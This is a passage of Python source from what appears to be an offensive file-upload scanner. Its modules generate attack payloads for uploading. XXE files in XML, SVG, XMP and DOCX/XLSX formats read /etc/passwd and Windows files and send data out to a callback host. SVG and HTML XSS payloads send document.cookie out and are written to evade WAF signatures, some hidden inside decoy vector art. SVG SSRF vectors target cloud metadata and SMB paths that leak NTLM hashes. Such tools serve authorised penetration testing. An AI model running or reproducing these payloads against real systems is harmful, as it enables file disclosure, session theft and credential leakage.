        xml_payloads.append(
            f'<?xml version="1.0"?>\n'
            f'<!DOCTYPE foo PUBLIC "-//A/B/EN" "{oast}/xxe/{probe}.dtd">\n'
            f'<root><data>trigger</data></root>'.encode()
        )
        # Parameter entity
        xml_payloads.append(
            f'<?xml version="1.0"?>\n'
            f'<!DOCTYPE foo [ <!ENTITY % other SYSTEM "{oast}/xxe/{probe}"> %other; ]>\n'
            f'<root><data>trigger</data></root>'.encode()
        )
        # Entity callback
        xml_payloads.append(
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{oast}/xxe/{probe}">]>\n'
            f'<root><data>&xxe;</data></root>'.encode()
        )
        # xml-stylesheet SSRF
        xml_payloads.append(
            f'<?xml version="1.0"?>\n'
            f'<?xml-stylesheet type="text/xml" href="{oast}/xxe/{probe}.xsl"?>\n'
            f'<root><data>trigger</data></root>'.encode()
        )
        # schemaLocation SSRF
        xml_payloads.append(
            f'<root xmlns="{oast}/xxe/{probe}" '
            f'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
            f'xsi:schemaLocation="{oast}/xxe/{probe} {oast}/xxe/{probe}.xsd">'
            f'<data>trigger</data></root>'.encode()
        )
        # OOB exfil via php://filter base64 (ssrf_orwa.xml): base64-encode the file
        # so its bytes survive as a single URL query param to the OAST callback —
        # solves the #1 OOB-XXE failure (raw passwd colons/newlines breaking the URI).
        xml_payloads.append(
            f'<?xml version="1.0"?>\n'
            f'<!DOCTYPE foo [\n'
            f'<!ENTITY % data SYSTEM '
            f'"php://filter/convert.base64-encode/resource={LF_PASSWD}">\n'
            f'<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM '
            f'\'{oast}/xxe/{probe}?d=%data;\'>">\n'
            f'%param1;\n%exfil;\n]>\n'
            f'<root>trigger</root>'.encode()
        )

    # Office-style XML with XXE (survives DOCX/XLSX upload)
    docx_xxe = (
        f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{LF_PASSWD}">]>\n'
        f'<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">\n'
        f'<w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>'
    ).encode()

    variants = []
    for p in xml_payloads:
        for ext, mime in [
            ("xml",    "application/xml"),
            ("xml",    "text/xml"),
            ("xml",    ""),
            (allowed,  "application/xml"),
            (allowed,  ""),
        ]:
            variants.append((ctx.rnd_name() + "." + ext, p, mime or "application/xml"))
    for ext, mime in [
        ("docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document"),
        ("xlsx", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"),
        ("docx", ""),
        ("xlsx", ""),
    ]:
        variants.append((ctx.rnd_name() + "." + ext, docx_xxe, mime or "application/zip"))
    run_variants(ctx, variants, "xxe_xml")


@module("xxe_svg")
def mod_xxe_svg(ctx: UploadContext):
    """XXE via SVG: entity LFI, parameter entity, XInclude, schemaLocation, external DTD.
    Ported from UploadScanner's Xxe.get_root_tag_techniques + get_tag_techniques.
    """
    info("xxe_svg — 5 XXE techniques: Entity, Param-Entity, XInclude, Schema, DTD")
    oast    = ctx.opts.oast or ""
    probe   = "UpMapXXE" + "".join(random.choices(string.digits, k=6))
    allowed = ctx.opts.allowed or "jpg"

    # LFI targets routed through _lfi(): --file-read overrides all of them.
    LF_PASSWD   = _lfi(ctx, "/etc/passwd")
    LF_WIN      = _lfi(ctx, "/c:/windows/win.ini")
    LF_HOSTNAME = _lfi(ctx, "/etc/hostname")
    payloads = [
        # 1. Classic entity — Linux /etc/passwd
        f'<?xml version="1.0" standalone="yes"?>\n'
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{LF_PASSWD}">]>\n'
        f'<svg xmlns="http://www.w3.org/2000/svg" width="300" height="200">\n'
        f'  <text font-size="16px" x="10" y="30">&xxe;</text>\n</svg>'.encode(),

        # 2. Classic entity — Windows win.ini
        f'<?xml version="1.0" standalone="yes"?>\n'
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{LF_WIN}">]>\n'
        f'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'.encode(),

        # 2b. Classic entity — /etc/hostname (host_getter.svg: shorter, IDs the box,
        #     survives some parsers that block /etc/passwd)
        f'<?xml version="1.0" standalone="yes"?>\n'
        f'<!DOCTYPE test [<!ENTITY xxe SYSTEM "file://{LF_HOSTNAME}">]>\n'
        f'<svg width="128" height="128" xmlns="http://www.w3.org/2000/svg" '
        f'xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">'
        f'<text font-size="16" x="0" y="16">&xxe;</text></svg>'.encode(),

        # 3. XInclude (no DOCTYPE needed — bypass some WAFs)
        f'<svg xmlns="http://www.w3.org/2000/svg" '
        f'xmlns:xi="http://www.w3.org/2001/XInclude">'
        f'<xi:include href="file://{LF_PASSWD}" parse="text"/></svg>'.encode(),

        # 4. Standalone parameter-entity eval chain (ssrf_x.xml): %file; -> %eval; -> &xxe;
        #    (was a malformed/incomplete entity here — corrected to the real chain).
        f'<?xml version="1.0"?>\n'
        f'<!DOCTYPE foo [\n'
        f'  <!ENTITY % file SYSTEM "file://{LF_PASSWD}">\n'
        f'  <!ENTITY % eval "<!ENTITY xxe \'%file;\'>">\n'
        f'  %eval;\n]>\n'
        f'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'.encode(),
    ]

    if oast:
        # 5. External DTD via OAST (UploadScanner Dtd technique)
        payloads.append(
            f'<?xml version="1.0"?>\n'
            f'<!DOCTYPE foo PUBLIC "-//A/B/EN" "{oast}/xxe/{probe}.dtd">\n'
            f'<svg xmlns="http://www.w3.org/2000/svg"><text>trigger</text></svg>'.encode()
        )
        # 6. Parameter entity + external DTD (best for blind XXE)
        payloads.append(
            f'<?xml version="1.0"?>\n'
            f'<!DOCTYPE foo [ <!ENTITY % other SYSTEM "{oast}/xxe/{probe}"> %other; ]>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg"><text>trigger</text></svg>'.encode()
        )
        # 7. Direct entity callback
        payloads.append(
            f'<?xml version="1.0" standalone="yes"?>\n'
            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{oast}/xxe/{probe}">]>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'.encode()
        )
        # 8. xml-stylesheet SSRF (UploadScanner Stylesheet technique)
        payloads.append(
            f'<?xml version="1.0"?>\n'
            f'<?xml-stylesheet type="text/xml" href="{oast}/xxe/{probe}.xsl"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg"><text>trigger</text></svg>'.encode()
        )
        # 9. schemaLocation SSRF (UploadScanner Schemalocation technique)
        payloads.append(
            f'<svg xmlns="http://www.w3.org/2000/svg" '
            f'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
            f'xsi:schemaLocation="{oast}/xxe/{probe} {oast}/xxe/{probe}.xsd">'
            f'<text>trigger</text></svg>'.encode()
        )
        # 10. Hostname exfiltration via XXE entity (from corpus: host_getter.svg)
        payloads.append(
            f'<?xml version="1.0" standalone="yes"?>'
            f'<!DOCTYPE test [<!ENTITY xxe SYSTEM "{oast}/xxe/host/{probe}">]>'
            f'<svg width="128" height="128" xmlns="http://www.w3.org/2000/svg" '
            f'xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">'
            f'<text font-size="16" x="0" y="16">&xxe;</text></svg>'.encode()
        )
        # 11. Combined XXE + SSRF in one file (img_ssrf.svg): a param-entity OOB
        #     chain AND an <image href=OAST> SSRF callback, so a single upload
        #     exercises both vectors — matters for one-shot / rate-limited endpoints.
        payloads.append(
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE svg [\n'
            f'  <!ENTITY % file SYSTEM "file://{LF_PASSWD}">\n'
            f'  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '
            f'\'{oast}/xxe/{probe}?p=%file;\'>">\n'
            f'  %eval;\n  %exfil;\n]>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" '
            f'xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">\n'
            f'  <image height="30" width="30" xlink:href="{oast}/svg-image/{probe}"/>\n'
            f'  <text x="0" y="20" font-size="20">trigger</text>\n'
            f'</svg>'.encode()
        )

    variants = []
    for p in payloads:
        for ext, mime in [("svg", "image/svg+xml"), ("svg", ""), ("svg", "text/xml"),
                          (allowed, "image/svg+xml"), (allowed, "")]:
            variants.append((ctx.rnd_name() + "." + ext, p, mime or "image/svg+xml"))
    run_variants(ctx, variants, "xxe_svg")


@module("xxe_xmp")
def mod_xxe_xmp(ctx: UploadContext):
    """XXE via XMP metadata embedded in image files (JPEG/PNG/PDF)."""
    info("xxe_xmp — XXE via XMP metadata in image files")
    oast  = ctx.opts.oast or ""

    xxe_xmp = (f'<?xpacket begin="﻿" id="W5M0MpCehiHzreSzNTczkc9d"?>\n'
               f'<?xml version="1.0" encoding="UTF-8"?>\n'
               f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{_lfi(ctx, "/etc/passwd")}">]>\n'
               f'<x:xmpmeta xmlns:x="adobe:ns:meta/">\n'
               f'  <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">\n'
               f'    <rdf:Description>&xxe;</rdf:Description>\n'
               f'  </rdf:RDF>\n</x:xmpmeta>\n'
               f'<?xpacket end="w"?>').encode("utf-8")

    variants = []
    for img_magic, ext in [(MAGIC["jpg"], "jpg"), (MAGIC["png"], "png")]:
        payload = img_magic + b"\n" + xxe_xmp
        variants.append((ctx.rnd_name() + "." + ext, payload, get_mime(ext)))
    run_variants(ctx, variants, "xxe_xmp")


@module("docx_xxe")
def mod_docx_xxe(ctx: UploadContext):
    """DOCX/XLSX/PPTX Office Open XML XXE — from docem-master tool.

    Creates real .docx/.xlsx/.pptx containers (ZIP of XMLs) with XXE payloads
    embedded inside word/document.xml. Unlike xxe_xml (raw XML), this targets
    servers that only accept Office file formats but parse the internal XML
    structure with an XXE-vulnerable parser.

    Sources: docem-master/payloads/xxe_special_1..6.txt
    Payloads: classic entity, SYSTEM file:///, OOB via DTD, http:// SSRF.
    """
    info("docx_xxe — real DOCX/XLSX containers with embedded XXE (docem technique)")
    oast  = ctx.opts.oast or "http://127.0.0.1/"
    probe = "UpMapXXE" + "".join(random.choices(string.digits, k=6))

    # XXE payloads to embed inside Office document.xml content node.
    # LFI targets routed through _lfi(): --file-read overrides every one,
    # collapsing the 3 fingerprint variants (passwd / boot.ini / lsb-release)
    # to one target — intentional under override mode.
    LF_PASSWD      = _lfi(ctx, "/etc/passwd")
    LF_BOOTINI     = _lfi(ctx, "/c:/boot.ini")
    LF_LSBRELEASE  = _lfi(ctx, "/etc/lsb-release")
    XXE_PAYLOADS = [
        # Classic entity reference (in-band reflection)
        f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{LF_PASSWD}">]>'
        f'<w:body xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        f'<w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>',
        # Windows-specific
        f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{LF_BOOTINI}">]>'
        f'<w:body xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        f'<w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>',
        # lsb-release fingerprint
        f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{LF_LSBRELEASE}">]>'
        f'<w:body xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        f'<w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>',
        # OOB — parameter entity + external DTD for blind exfil
        f'<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY>'
        f'<!ENTITY % dtd SYSTEM "{oast}evil.dtd">%dtd;%trick;]>'
        f'<w:body xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        f'<w:p><w:r><w:t>{probe}</w:t></w:r></w:p></w:body>',
        # HTTP SSRF via entity
        f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY ssrf SYSTEM "{oast}">]>'
        '<w:body xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        '<w:p><w:r><w:t>&ssrf;</w:t></w:r></w:p></w:body>',
    ]

    def build_docx(document_xml_body: str) -> bytes:
        """Build a minimal valid DOCX ZIP from an XML body string."""
        content_types = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Override PartName="/word/document.xml"'
            ' ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
            '</Types>'
        )
        rels = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"'
            ' Target="word/document.xml"/>'
            '</Relationships>'
        )
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("[Content_Types].xml", content_types)
            zf.writestr("_rels/.rels", rels)
            zf.writestr("word/document.xml", document_xml_body)
        return buf.getvalue()

    def build_xlsx(sheet_xml_body: str) -> bytes:
        """Build a minimal valid XLSX ZIP from sheet XML body."""
        content_types = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Override PartName="/xl/workbook.xml"'
            ' ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>'
            '<Override PartName="/xl/worksheets/sheet1.xml"'
            ' ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>'
            '</Types>'
        )
        rels = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"'
            ' Target="xl/workbook.xml"/>'
            '</Relationships>'
        )
        workbook = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"'
            ' xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
            '<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>'
        )
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("[Content_Types].xml", content_types)
            zf.writestr("_rels/.rels", rels)
            zf.writestr("xl/workbook.xml", workbook)
            zf.writestr("xl/worksheets/sheet1.xml", sheet_xml_body)
        return buf.getvalue()

    variants = []
    for payload in XXE_PAYLOADS:
        base = ctx.rnd_name()
        # DOCX variant
        docx_bytes = build_docx(payload)
        variants.append((f"{base}.docx", docx_bytes, "application/vnd.openxmlformats-officedocument.wordprocessingml.document"))
        variants.append((f"{base}.docx", docx_bytes, "application/octet-stream"))
        # XLSX variant (sheet XML with XXE in header)
        xlsx_bytes = build_xlsx(payload)
        variants.append((f"{base}.xlsx", xlsx_bytes, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"))
        # Also try uploading just the raw XML directly (fallback)
        variants.append((f"{base}.xml", payload.encode(), "application/xml"))

    run_variants(ctx, variants, "docx_xxe")


# ─────────────────────────────────────────────────────────────────────────────
# XSS
# ─────────────────────────────────────────────────────────────────────────────

# JavaScript execution sinks rotated through the XSS payloads. UpMap historically
# used only alert(), which some WAFs/CSP rules pattern-match literally; rotating
# the sink keeps the same proof-of-execution while dodging "alert(" signatures.
JS_SINKS = ["alert", "prompt", "confirm", "console.log", "document.write"]


def _decoy_svg(onload_js: str, n: int = 300) -> bytes:
    """Synthesize a 'steganographic' SVG: a large, real-looking vector image (n
    random decoy <path> elements) carrying a single onload= XSS trigger on the
    root <svg>. Mirrors the disguised cookie_stealer.svg/coffinxss.svg corpus
    files without shipping a fixed multi-hundred-KB blob — generated fresh each
    run, so the decoy geometry isn't statically signaturable. onload_js must be
    pre-escaped for an XML double-quoted attribute (no raw double quotes)."""
    paths = []
    for _ in range(max(1, n)):
        d = "M{} {} ".format(random.randint(0, 2560), random.randint(0, 1600))
        d += " ".join(
            "{} {} {}".format(random.choice("LQTlqt"),
                              random.randint(-40, 2600), random.randint(-40, 1640))
            for _ in range(random.randint(3, 9)))
        shade = random.randint(0, 0xFFFFFF)
        paths.append(f'<path d="{d}" fill="#{shade:06x}" stroke="none"/>')
    body = "\n".join(paths)
    svg = (
        '<?xml version="1.0" standalone="no"?>\n'
        '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.0//EN" '
        '"http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">\n'
        '<svg version="1.0" xmlns="http://www.w3.org/2000/svg" '
        'width="2560pt" height="1600pt" viewBox="0 0 2560 1600" '
        f'preserveAspectRatio="xMidYMid meet" onload="{onload_js}">\n'
        '<g transform="translate(0,1600) scale(0.1,-0.1)" fill="#000000" stroke="none">\n'
        f'{body}\n'
        '</g>\n</svg>\n'
    )
    return svg.encode()


@module("xss_svg")
def mod_xss_svg(ctx: UploadContext):
    """XSS via SVG: event handlers + script tags, with JS-sink rotation
    (alert/prompt/confirm/console.log/document.write), an OAST cookie-exfil chain,
    and a synthetic steganographic SVG that hides the trigger in decoy vector art."""
    info("xss_svg — SVG XSS: sink rotation + OAST cookie-exfil + steganographic carrier")
    probe = "UpMapXSS" + "".join(random.choices(string.digits, k=6))
    oast  = ctx.opts.oast or ""

    def shapes(call: str) -> list:
        """SVG payload shapes carrying a JS *call* expression (single-quoted args
        only, so each is safe inside a double-quoted onload= attribute)."""
        return [
            f'<svg xmlns="http://www.w3.org/2000/svg" onload="{call}">'
            f'<rect width="100" height="100"/></svg>'.encode(),
            f'<svg xmlns="http://www.w3.org/2000/svg"><script>{call}</script></svg>'.encode(),
            f'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg">'
            f'<foreignObject><script xmlns="http://www.w3.org/1999/xhtml">'
            f'{call}</script></foreignObject></svg>'.encode(),
            f'<svg xmlns="http://www.w3.org/2000/svg">'
            f'<animate onbegin="{call}" attributeName="x" dur="1s"/></svg>'.encode(),
        ]

    svgs = []
    # #2 — rotate the execution sink so the payload dodges literal "alert(" filters
    # while still proving script execution.
    for sink in JS_SINKS:
        svgs += shapes(f"{sink}('{probe}')")

    # Full domain+cookie readout (polygon-disguised, classic RootSploit.svg shape).
    svgs.append(
        (f'<?xml version="1.0" standalone="no"?>'
         f'<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" '
         f'"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">'
         f'<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" '
         f'width="1500" height="1500">'
         f'<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>'
         f'<script>alert(\'{probe}\'+"\\n"+document.domain+"\\n"+document.cookie)</script>'
         f'</svg>').encode())

    # #3 — exfil chain. With OAST: beacon document.domain+cookie to the collaborator,
    # then redirect to the OAST host (never a third-party domain). Without OAST:
    # fall back to an enriched alert readout — no network, no redirect.
    if oast:
        exfil_js = (f"new Image().src='{oast}/xss/{probe}?d='+encodeURIComponent("
                    f"document.domain+'|'+document.cookie);"
                    f"location.href='{oast}/xss-land/{probe}';")
    else:
        exfil_js = (f"alert('{probe}'+String.fromCharCode(10)+document.domain"
                    f"+String.fromCharCode(10)+document.cookie)")
    svgs.append(
        f'<svg xmlns="http://www.w3.org/2000/svg"><script>{exfil_js}</script></svg>'.encode())

    # #1 — steganographic carriers: the trigger rides on the root <svg onload=>,
    # buried in hundreds of decoy vector paths so the file renders as real art.
    stego = [
        _decoy_svg("prompt(document.cookie)"),   # cookie_stealer.svg style
        _decoy_svg(exfil_js),                     # full beacon/alert hidden in decoy art
    ]

    variants = []
    for s in svgs:
        for mime in ["image/svg+xml", "text/html", ""]:
            variants.append((ctx.rnd_name() + ".svg", s, mime or "image/svg+xml"))
    for s in stego:
        for mime in ["image/svg+xml", ""]:
            variants.append((ctx.rnd_name() + ".svg", s, mime or "image/svg+xml"))
    run_variants(ctx, variants, "xss_svg")


@module("xss_html")
def mod_xss_html(ctx: UploadContext):
    """XSS via direct HTML/script injection in .html/.htm/.xhtml files,
    rotating the JS sink (alert/prompt/confirm/console.log/document.write)."""
    info("xss_html — HTML XSS injection (sink rotation)")
    probe = "UpMapXSS" + "".join(random.choices(string.digits, k=6))

    htmls = [
        # #2 — one <script> body per sink, so "alert(" signatures don't catch all.
        f'<html><body><script>{sink}(\'{probe}\')</script></body></html>'.encode()
        for sink in JS_SINKS
    ]
    htmls += [
        f'<img src=x onerror="prompt(\'{probe}\')">'.encode(),
        f'<script>confirm("{probe}")</script>'.encode(),
        f'<!DOCTYPE html><html><script>alert("{probe}")</script></html>'.encode(),
    ]
    variants = []
    for h in htmls:
        for ext in ["html", "htm", "xhtml", "shtml"]:
            for mime in ["text/html", "text/plain", ""]:
                variants.append((ctx.rnd_name() + "." + ext, h, mime or "text/html"))
    run_variants(ctx, variants, "xss_html")


@module("xss_polyglot")
def mod_xss_polyglot(ctx: UploadContext):
    """XSS polyglot: image files with embedded JavaScript (CSP bypass)."""
    info("xss_polyglot — image+script polyglot (CSP bypass)")
    probe    = "UpMapXSS" + "".join(random.choices(string.digits, k=6))
    js_chunk = f'/*</style></script><script>alert("{probe}")</script>'.encode()
    allowed  = ctx.opts.allowed or "jpg"
    magic    = MAGIC.get(allowed, MAGIC["jpg"])

    variants = []
    for ext in [allowed, "jpg", "png", "gif"]:
        payload = magic + js_chunk
        for mime in [get_mime(ext), "image/jpeg"]:
            variants.append((ctx.rnd_name() + "." + ext, payload, mime))

    # GIF89a + <script> / <img onerror> on double-extension names (stored-XSS sniff,
    # mirrors xss.gif.png — a content sniffer sees GIF magic, the browser renders HTML).
    gif_script = b"GIF89a" + f'<script>alert("{probe}")</script>'.encode()
    gif_img    = b"GIF89a" + f'<img src=x onerror=alert("{probe}")>'.encode()
    for body in (gif_script, gif_img):
        for suffix in (".gif.png", ".png", ".svg"):
            for mime in ["image/png", "image/gif", "text/html"]:
                variants.append((ctx.rnd_name() + suffix, body, mime))
    run_variants(ctx, variants, "xss_polyglot")


@module("svg_ssrf")
def mod_svg_ssrf(ctx: UploadContext):
    """SVG SSRF — 18+ distinct element/attribute vectors that make a server-side
    SVG renderer fetch a URL, including UNC/SMB path for NTLM hash leaks.
    Covers: feImage xlink:href, foreignObject iframe/img, image href/xlink:href,
    link stylesheet, path fill=url(), pattern>image, rect fill=url() (+ UNC/SMB),
    style CDATA @font-face/@import, plain @import, textPath/tref/use xlink:href,
    xi:include, <?xml-stylesheet?> PI.
    """
    info("svg_ssrf — 18 SSRF vectors via SVG element/attribute URL fetches + SMB/NTLM")
    oast    = ctx.opts.oast or ""
    allowed = ctx.opts.allowed or "jpg"
    oast_host = oast.replace("https://", "").replace("http://", "").split("/")[0] if oast else "169.254.169.254"

    def _url(label: str) -> str:
        if oast:
            return f"{oast}/{label}"
        return "http://169.254.169.254/latest/meta-data/"

    probe = "UpMapSSRF" + "".join(random.choices(string.digits, k=6))
    url_fe   = _url(f"svg-feImage/{probe}")
    url_fi   = _url(f"svg-fo-iframe/{probe}")
    url_fm   = _url(f"svg-fo-img/{probe}")
    url_ih   = _url(f"svg-image-href/{probe}")
    url_ix   = _url(f"svg-image-xlink/{probe}")
    url_lk   = _url(f"svg-link/{probe}")
    url_pf   = _url(f"svg-path-fill/{probe}")
    url_pi   = _url(f"svg-pattern-img/{probe}")
    url_rf   = _url(f"svg-rect-fill/{probe}")
    url_ff   = _url(f"svg-font-face/{probe}")
    url_si   = _url(f"svg-cdata-import/{probe}")
    url_sp   = _url(f"svg-plain-import/{probe}")
    url_tp   = _url(f"svg-textPath/{probe}")
    url_tr   = _url(f"svg-tref/{probe}")
    url_us   = _url(f"svg-use/{probe}")
    url_xi   = _url(f"svg-xi-include/{probe}")
    url_xs   = _url(f"svg-xml-stylesheet/{probe}")

    payloads = [
        ("feImage_xlink_href", (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">\n'
            f'  <feImage xlink:href="{url_fe}" width="200" height="200"/>\n'
            f'</svg>'
        ).encode()),
        ("foreignObject_iframe", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">\n'
            f'  <foreignObject width="1000" height="1000">\n'
            f'    <iframe xmlns="http://www.w3.org/1999/xhtml" src="{url_fi}"></iframe>\n'
            f'  </foreignObject>\n'
            f'</svg>'
        ).encode()),
        ("foreignObject_img", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">\n'
            f'  <foreignObject width="100" height="100">\n'
            f'    <img xmlns="http://www.w3.org/1999/xhtml" src="{url_fm}"/>\n'
            f'  </foreignObject>\n'
            f'</svg>'
        ).encode()),
        ("image_href_svg2", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">\n'
            f'  <image href="{url_ih}" height="100" width="100"/>\n'
            f'</svg>'
        ).encode()),
        ("image_xlink_href", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">\n'
            f'  <image height="30" width="30" xlink:href="{url_ix}"/>\n'
            f'</svg>'
        ).encode()),
        ("link_stylesheet", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg">\n'
            f'  <link xmlns="http://www.w3.org/1999/xhtml" rel="stylesheet" href="{url_lk}" type="text/css"/>\n'
            f'  <rect x="0" y="150" height="10" width="300" style="fill: black"/>\n'
            f'</svg>'
        ).encode()),
        ("path_fill_url", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">\n'
            f'  <path fill="url({url_pf})" stroke="#a1a1a1"/>\n'
            f'</svg>'
        ).encode()),
        ("pattern_image_xlink", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">\n'
            f'  <defs>\n'
            f'    <pattern id="exfil" width="512" height="512" patternUnits="userSpaceOnUse">\n'
            f'      <image xlink:href="{url_pi}" x="0" y="0" height="256" width="256"/>\n'
            f'    </pattern>\n'
            f'  </defs>\n'
            f'</svg>'
        ).encode()),
        ("rect_fill_url", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">\n'
            f'  <rect fill="url({url_rf})"/>\n'
            f'</svg>'
        ).encode()),
        ("rect_fill_smb_unc", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">\n'
            f'  <rect fill="url(\\\\{oast_host}\\{probe}\\smbshare\\)"/>\n'
            f'</svg>'
        ).encode()),
        ("style_cdata_font_face", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">\n'
            f'  <defs>\n'
            f'    <style type="text/css">\n'
            f'      <![CDATA[\n'
            f'        @font-face {{ font-family: pwn; src: url(\'{url_ff}\'); }}\n'
            f'      ]]>\n'
            f'    </style>\n'
            f'  </defs>\n'
            f'  <text x="100" y="100" style="font-family: \'pwn\';">SSRF</text>\n'
            f'</svg>'
        ).encode()),
        ("style_cdata_import", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">\n'
            f'  <defs>\n'
            f'    <style type="text/css">\n'
            f'      <![CDATA[\n'
            f'        @import url("{url_si}");\n'
            f'        rect {{ fill: red; }}\n'
            f'      ]]>\n'
            f'    </style>\n'
            f'  </defs>\n'
            f'  <rect x="200" y="100" width="600" height="300"/>\n'
            f'</svg>'
        ).encode()),
        ("style_plain_import", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">\n'
            f'  <style>@import url("{url_sp}");</style>\n'
            f'  <rect/>\n'
            f'</svg>'
        ).encode()),
        ("textPath_xlink_href", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">\n'
            f'  <path id="MyPath" fill="none" stroke="red" d="M10,90 Q90,90 90,45"/>\n'
            f'  <text><textPath xlink:href="{url_tp}"></textPath></text>\n'
            f'</svg>'
        ).encode()),
        ("tref_xlink_href", (
